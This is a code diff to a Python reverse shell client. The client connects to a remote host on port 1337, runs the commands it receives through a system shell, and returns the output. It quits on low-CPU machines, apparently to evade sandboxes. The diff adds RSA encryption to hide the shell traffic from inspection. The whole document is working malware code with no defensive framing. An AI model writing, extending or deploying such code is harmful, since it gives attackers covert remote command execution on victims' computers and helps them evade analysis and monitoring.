@@ -3,7 +3,10 @@
 import os
 import socket
 import subprocess
+import rsa
 
+public_key, private_key = rsa.newkeys(2048)
+public_partner = None
 
 if os.cpu_count() <= 2:
     quit()
@@ -14,12 +17,13 @@ PORT = 1337
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
-s.send(str.encode("Successfully entered reverse shell session.\n"))
+public_partner = rsa.PublicKey.load_pkcs1(s.recv(2048))
+s.send(public_key.save_pkcs1("PEM"))
 
 while 1:
     try:
-        s.send(str.encode(os.getcwd() + " > "))
-        data = s.recv(1024).decode("UTF-8")
+        s.send(rsa.encrypt(str.encode(os.getcwd() + " > "), public_partner))
+        data = rsa.decrypt(s.recv(1024), private_key).decode("UTF-8")
         data = data.strip('\n')
         if data == "quit": 
             break
@@ -29,7 +33,7 @@ while 1:
             proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
             stdout_value = proc.stdout.read() + proc.stderr.read()
             output_str = str(stdout_value, "UTF-8")
-            s.send(str.encode("\n" + output_str))
+            s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
     except Exception as e:
         continue
     
